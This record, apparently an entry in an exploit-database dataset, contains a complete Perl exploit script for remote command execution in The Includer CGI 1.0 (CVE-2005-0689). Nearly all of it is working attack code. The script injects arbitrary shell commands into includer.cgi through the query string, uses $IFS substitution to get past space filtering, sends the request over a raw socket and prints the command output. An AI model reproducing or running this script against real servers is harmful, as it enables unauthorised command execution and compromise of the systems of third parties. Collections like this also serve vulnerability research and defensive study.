{
  "id": "922",
  "title": "The Includer CGI 1.0 - Remote Command Execution (2)",
  "cve": "CVE-2005-0689",
  "vuln_type": "unknown",
  "code": "                                                                                                                                                                                                                                                               #!/usr/bin/perl\r\n\r\n############################################################\r\n# Target - The Includer CGI <= 1.0                         #\r\n#                                                          #\r\n# Based on - http://www.milw0rm.com/id.php?id=862 (https://www.exploit-db.com/exploits/862/)          #\r\n#                                                          #\r\n# Info about bug - Stupid use \"Open\" function.             #\r\n#                                                          #\r\n############################################################\r\n# If you want know more visit our home page at nst.void.ru #\r\n############################################################\r\nuse IO::Socket;\r\n\r\n\r\nif (@ARGV < 3)\r\n{\r\n  print \" \\n Includer CGI <= 1.0 Network Security Team - nst.void.ru\\n\\n\";\r\n  print \" Usage: <target> <dir> <cmd>\\n\\n\"; \r\n  print \"   <host> - Host name of taget.\\n\";\r\n  print \"   <dir> - If not in dir type / symbol.\\n\";\r\n  print \"   <cmd> - command for execution.\\n\\n\";\r\n  print \" Examples:\\n\\n\";\r\n  print \"   incl_10.pl 127.0.0.1 /cgi-bin/ \\\"ls -la\\\"\\n\";\r\n  print \"   incl_10.pl 127.0.0.1 / \\\"uname -a\\\"\\n\";\r\n  print \"   incl_10.pl www.test.com / \\\"ps auxw\\\"\\n\";\r\n  exit();\r\n}\r\n\r\n\r\n$serv = $ARGV[0];\r\n$serv =~ s/http:\\/\\///ge;\r\n\r\n$dir = $ARGV[1];\r\n$cmd = $cmde = $ARGV[2];\r\n  \r\nprint \"\\n ===[ Info for query ]========================\\n\";   \r\nprint \" = Target: $serv\\n\";\r\nprint \" = Dir: $dir\\n\";\r\nprint \" = Cmd: $cmd\\n\";\r\nprint \" =============================================\\n\\n\";   \r\n\r\n$cmde =~ s/ /\"\\$IFS\"/ge;\r\n\r\n$req  = \"GET http://$serv\";                                      \r\n$req .= \"$dir\";\r\n$req .= \"includer.cgi?|echo\\$IFS\\\"_N_\\\";$cmde;echo\\$IFS\\\"_T_\\\"| HTTP/1.0\\n\\n\";\r\n\r\n\r\n$s = IO::Socket::INET->new(Proto=>\"tcp\",\r\n                           PeerAddr=>\"$serv\",\r\n                           PeerPort=>80) or die \" (-) - Can't connect to the server\\n\";\r\n\r\nprint $s $req;\r\n\r\n$flag = 0;\r\n\r\nwhile ($ans = <$s>)\r\n\r\n {\r\n   if ($ans =~ /_T_/) { print \" =========================================================\\n\"; exit() }\r\n   if ($flag == 1) { print \" $ans\"; }\r\n   if ($ans =~ /^_N_/) { print \" ===[ Executed command $cmd ]===============================\\n\"; $flag = 1 }\r\n   \r\n }\r\n\r\n# milw0rm.com [2005-04-08]",
  "url": "https://www.exploit-db.com/exploits/922"
}